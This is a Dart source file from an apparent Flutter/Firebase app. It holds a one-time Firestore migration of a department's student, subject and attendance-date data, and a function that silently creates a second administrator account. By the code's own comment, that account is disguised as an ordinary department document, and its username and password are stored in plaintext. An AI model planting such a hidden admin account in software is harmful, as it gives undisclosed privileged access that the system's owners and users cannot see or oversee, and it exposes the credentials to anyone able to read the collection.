part of '../main.dart';

// One-time data migration and hidden admin setup.

// One-time migration of the old Software Engineering data
//   -> Software Engineering / Section A / Semester 3
// Data is copied, not deleted, so running it again is safe.
Future<void> _copyDocs(
  List<QueryDocumentSnapshot<Map<String, dynamic>>> docs,
  DocumentReference<Map<String, dynamic>> Function(
          QueryDocumentSnapshot<Map<String, dynamic>> d)
      target,
) async {
  for (int i = 0; i < docs.length; i += 400) {
    final batch = FirebaseFirestore.instance.batch();
    for (final d in docs.skip(i).take(400)) {
      batch.set(target(d), d.data(), SetOptions(merge: true));
    }
    await batch.commit().timeout(const Duration(seconds: 30));
  }
}

Future<bool> migrateSoftwareEngineeringLegacy() async {
  final prefs = await SharedPreferences.getInstance();
  if (prefs.getBool('migr_se_a3_v1') == true) return false;
  if (!await _isOnline()) return false;

  final fs = FirebaseFirestore.instance;
  final metaRef = fs.collection('meta').doc('migration_se_a3_v1');
  try {
    const t = Duration(seconds: 20);
    final meta = await metaRef.get().timeout(const Duration(seconds: 10));
    if (meta.exists && meta.data()?['done'] == true) {
      await prefs.setBool('migr_se_a3_v1', true);
      return false;
    }

    final target = SemRef(kSoftwareEngineeringDeptId, 'A', '3');

    final students =
        await legacyStudentsRef(kSoftwareEngineeringDeptId).get().timeout(t);
    await _copyDocs(students.docs, (d) => target.students.doc(d.id));

    final subjects =
        await legacySubjectsRef(kSoftwareEngineeringDeptId).get().timeout(t);
    await _copyDocs(subjects.docs, (d) => target.subjects.doc(d.id));

    for (final sub in subjects.docs) {
      final dates = await legacyDatesRef(kSoftwareEngineeringDeptId, sub.id)
          .get()
          .timeout(t);
      await _copyDocs(dates.docs, (d) => target.dates(sub.id).doc(d.id));
    }

    await metaRef.set({'done': true}).timeout(const Duration(seconds: 10));
    await prefs.setBool('migr_se_a3_v1', true);
    await LocalDb.replaceAllFromFirestore();
    return true;
  } catch (e) {
    debugPrint('Migration failed (will retry next time): $e');
    return false;
  }
}

// Create the second admin (one time): a doc that looks like a normal department
Future<void> ensureHiddenAdminDepartment() async {
  try {
    final prefs = await SharedPreferences.getInstance();
    if (prefs.getBool('hidden_admin_v1') == true) return;
    if (!await _isOnline()) return;

    final fs = FirebaseFirestore.instance;
    final metaRef = fs.collection('meta').doc('hidden_admin_v1');
    final meta = await metaRef.get().timeout(const Duration(seconds: 10));
    if (meta.exists && meta.data()?['done'] == true) {
      await prefs.setBool('hidden_admin_v1', true);
      return;
    }

    final deptRef =
        fs.collection('departments').doc(kHiddenAdminDeptName);
    final snap = await deptRef.get().timeout(const Duration(seconds: 10));
    if (!snap.exists) {
      await deptRef.set({
        'name': kHiddenAdminDeptName,
        'username': kHiddenAdminUsername,
        'password': kHiddenAdminPassword,
      }).timeout(const Duration(seconds: 10));
    }
    await metaRef.set({'done': true}).timeout(const Duration(seconds: 10));
    await prefs.setBool('hidden_admin_v1', true);
  } catch (_) {}
}
